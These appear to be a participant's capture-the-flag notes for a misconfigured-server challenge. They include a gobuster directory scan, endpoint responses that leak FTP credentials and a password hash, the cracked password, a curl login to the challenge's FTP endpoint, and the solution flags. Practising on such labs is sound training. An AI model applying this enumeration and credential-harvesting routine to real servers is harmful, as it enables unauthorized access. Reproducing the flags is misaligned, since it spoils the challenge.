Challenge IP: 139.144.167.19
```bash
gobuster dir -u 139.144.167.19 -w /usr/share/wordlists/dirb/common.txt
```
`labuser`:
``` 
HttpL4b!
```

`flag{http_dir_listing_cred_leak}`

# Challenge 2

## Endpoints found
- backup
```JSON
{
    "message": "Backup config found!",
    "config": {
        "ftp_user": "admin",
        "ftp_pass": "password123"
    }
}
```
- Logs
```JSON
{
    "message": "Log file found!",
    "log": {
        "entry": "FTP auth data",
        "part2": "admin",
        "hash": "NTg1OGVhMjI4Y2MyZWRmODg3MjE2OTliMmM4NjM4ZTU="
    }
}
```
- logs
```JSON
{
    "message": "Log file found!",
    "log": {
        "entry": "FTP auth data",
        "part2": "admin",
        "hash": "NTg1OGVhMjI4Y2MyZWRmODg3MjE2OTliMmM4NjM4ZTU="
    }
}
```
- auth
```JSON
{
    "session": "ctf-session-2025",
    "note": "Use this session token for /ftp."
}
```
- ftp
	- get
```JSON
{
    "message": "Welcome to FTP service. POST username, password, and session token."
}
```
- config
```JSON
{
    "message": "Partial configuration found!",
    "config": {
        "part1": "sys"
    }
}
```

# Admin info
Username : `sysadmin`
Password Hash : `NTg1OGVhMjI4Y2MyZWRmODg3MjE2OTliMmM4NjM4ZTU=` | `5858ea228cc2edf88721699b2c8638e5`
Password : `welcome123`

Flag : `CxC{misconfigured_server}`
`CxC{m51sc0nf1gur3d_53rv3r}`



```Bash
curl -X POST https://ftp-challenge1.onrender.com/ftp \
  -H "Content-Type: application/json" \
  -d '{"username":"sysadmin","password":"welcome123","session":"ctf-session-2025"}'
```